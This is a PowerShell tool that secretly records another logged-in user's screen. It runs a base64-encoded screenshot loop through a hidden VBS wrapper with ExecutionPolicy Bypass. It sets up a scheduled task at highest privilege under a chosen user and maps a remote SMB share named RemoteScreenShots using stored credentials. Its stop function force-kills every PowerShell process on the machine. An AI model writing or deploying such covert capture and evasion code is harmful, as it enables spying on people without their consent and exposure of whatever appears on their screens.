

$Script = @"


function Add-TaskLog{{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = `$True, Position =0)]
        [string]`$LogMsg
    )
    `$strtime = [datetime]::Now.GetDateTimeFormats()[19].Replace(`" `",`":`")
    
    Add-Content -Path `"`$ENV:Temp\task_record.log`" -Value `"[`$strtime] `$LogMsg`"

}}



function Save-Screenshot {{
    [CmdletBinding()]
    param()

        Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    `$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    `$bitmap = New-Object System.Drawing.Bitmap `$bounds.Width, `$bounds.Height
    `$graphics = [System.Drawing.Graphics]::FromImage(`$bitmap)
    `$graphics.CopyFromScreen(`$bounds.Location, [System.Drawing.Point]::Empty, `$bounds.Size)
    `$tmpLoc = `$bounds.Location.ToString()
    `$tmpSize = `$bounds.Size
     Add-TaskLog `"Save-Screenshot `$tmpLoc `$tmpSize`"
    `$timestamp = Get-Date -Format `"yyyyMMdd_HHmmss`"
    `$filename = Join-Path `"C:\ProgramData\Screenshots`" `"screenshot_`$timestamp.png`"
    `$bitmap.Save(`$filename, [System.Drawing.Imaging.ImageFormat]::Png)
     Add-TaskLog `"Save-Screenshot saving to `$filename`"
    `$graphics.Dispose()
    `$bitmap.Dispose()
}}

function Start-SaveScreenshots {{

    # TakeScreenshots.ps1
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = `$false)]
        [ValidateRange(5,120)]
        [int]`$Minutes = 10,
        [Parameter(Mandatory = `$false)]
        [ValidateRange(5,120)]
        [int]`$Delay = 30,
        [Parameter(Mandatory = `$false)]
        [switch]`$Force
    )
    [System.DateTime]`$Until = [System.DateTime]::Now.AddMinutes(`$Minutes)

    `$OutputPath = `"K:\`"

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    [int]`$count=1

    `$Elapsed = ([System.DateTime]::Now -gt `$Until)
    Add-TaskLog `"Started `$Until `"
    while (`$Elapsed -eq `$False) {{
        `$count++
        `$UntilStr = `$Until.ToString()
        Add-TaskLog `"`$count  `$UntilStr Calling Save-Screenshot, sleep `$Delay`"
        `$Elapsed = ([System.DateTime]::Now -gt `$Until)
        Save-Screenshot
        Start-Sleep -Seconds `$Delay
    }}
}}



Add-TaskLog `"Started`"
Start-SaveScreenshots -Minutes {0} -Delay {1}

"@

function Invoke-MapRemoteDrive {

    # TakeScreenshots.ps1
    [CmdletBinding()]
    param()


       $NetExe = (Get-Command "net.exe").Source
        $Credz = Get-AppCredentials -Id "mini.samba.shares"
        $SmbUser = $Credz.UserName
        $SmbPasswd = $Credz.GetNetworkCredential().Password
        $UserOpt = '/USER:{0}' -f $SmbUser
        $PersistOpt = "/persistent:yes"

        $letter = "k:"
        $path = "\\10.0.0.138\RemoteScreenShots"
        &"$NetExe" "use" "$letter" "$path" "$PersistOpt" "$UserOpt" "$SmbPasswd"

        if($? -eq $True){
            Write-Host "Great!" -f Darkgreen

        }else{
            Write-Host "error" -f DarkRed
        }
}


function Invoke-StartRecord {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [ValidateRange(5, 120)]
        [int]$Minutes = 10,
        [Parameter(Mandatory = $false)]
        [ValidateRange(5, 120)]
        [int]$Delay = 30
    )
    try {
        $UseVbs = $True

        [string]$ScriptString = $Script -f $Minutes, $Delay

        [string]$ScriptBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ScriptString))
$now = [datetime]::Now.AddSeconds(30)
        # Example Usage
        $selectedUser = Select-LoggedInUser
        Write-Host "You selected: $selectedUser"

        [string]$TaskName = "ScreenshotsDelayedRemote"

        try {
            Write-Host "Unregister task $TaskName" -NoNewline -f DarkYellow
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction Stop
            Write-Host "Success" -f DarkGreen
        } catch {
            Write-Host "Failed" -f DarkRed
        }

[string]$VBSFile = "$env:TEMP\hidden_powershell.vbs"
        [string]$VBSContent = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -EncodedCommand $ScriptBase64", 0, False
"@

[string]$ArgumentString = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {0}" -f $ScriptBase64
        Write-host "Create Scheduled Task with Base64 Encoded Command"
       

$VBSContent | Set-Content -Path $VBSFile -Encoding ASCII
[int]$rc=15
            Write-Host "Create a Scheduled Task to Run the VBS Script"
            $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument `"$VBSFile`"

         #$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $ScriptBase64"

        
        $ts = New-TimeSpan -Minutes 1

        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount $rc -RestartInterval $ts -MultipleInstances IgnoreNew
        $Trigger = New-ScheduledTaskTrigger  -At $now -Once:$false
        $Principal = New-ScheduledTaskPrincipal -UserId "$selectedUser" -LogonType Interactive -RunLevel Highest
        $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings 

        write-host "Register and Run Task"
        Register-ScheduledTask -TaskName $TaskName -InputObject $Task | Out-Null
        Start-ScheduledTask -TaskName $TaskName

        Write-Host "In 10 seconds... $ENV:Temp\task_record.log"
        
    } catch {
        write-error "$_"
    }

}

function Invoke-StopRecord {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [ValidateRange(5, 120)]
        [int]$Minutes = 10,
        [Parameter(Mandatory = $false)]
        [ValidateRange(5, 120)]
        [int]$Delay = 30
    )
    try {
        [string]$TaskName = "ScreenshotsDelayedRemote"
        [int]$NumPowershell = (tasklist | Select-String "powershell" -Raw  | measure ).Count
        try {
            Stop-ScheduledTask -TaskName $TaskName -ErrorAction Stop
            Write-Host "Unregister task $TaskName" -NoNewline -f DarkYellow
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction Stop
            Write-Host "Success" -f DarkGreen
        } catch {
            Write-Host "Failed" -f DarkRed
        }
        [string[]]$Res = &"C:\Windows\system32\taskkill.exe" "/IM" "powershell.exe" "/F" 2> "$ENV:Temp\killres.txt"
        $Killed = $Res.Count
        Write-Host "NumPowershell $NumPowershell Killed $Killed"
        
    } catch {
        write-error "$_"
    }

}
